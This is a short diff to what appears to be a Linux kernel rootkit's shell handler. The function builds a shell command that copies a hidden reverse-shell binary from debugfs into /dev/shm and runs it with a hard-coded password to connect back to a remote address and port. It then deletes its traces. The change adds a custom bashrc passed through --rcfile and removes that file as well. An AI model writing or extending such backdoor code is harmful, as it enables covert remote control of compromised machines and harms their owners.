@@ -36,6 +36,7 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 
 	char *dir_name = htm_debugfs_name_dir();
 	char *rsh_name = htm_debugfs_name_rsh();
+	char *bashrc_name = htm_debugfs_name_bashrc();
 
 	memset(cmd, 0x00, sizeof(cmd));
 
@@ -44,9 +45,12 @@ static notrace int _htm_shell_handler(__be32 *saddr)
 	ret = scnprintf(
 		cmd, sizeof(cmd) - 1,
 		"cp /sys/kernel/debug/%s/%s /dev/shm/;"
-		"/dev/shm/%s -nfk " HTM_RSH_PASSWORD " -E " HTM_EXEC_SHELL " %pI4 %d;"
-		"rm /dev/shm/%s",
-		dir_name, rsh_name, rsh_name, saddr, HTM_RSH_PORT, rsh_name
+		"cp /sys/kernel/debug/%s/%s /dev/shm/;"
+		"/dev/shm/%s -nf -k " HTM_RSH_PASSWORD
+		" -E '" HTM_EXEC_SHELL " --rcfile /dev/shm/%s' %pI4 %d;"
+		"sleep 0.5; rm /dev/shm/%s; rm /dev/shm/%s",
+		dir_name, rsh_name, dir_name, bashrc_name, rsh_name, bashrc_name, saddr,
+		HTM_RSH_PORT, rsh_name, bashrc_name
 	);
 
 	// If `debugfs` wasn't enabled, disable it in user space to prevent a race condition due to
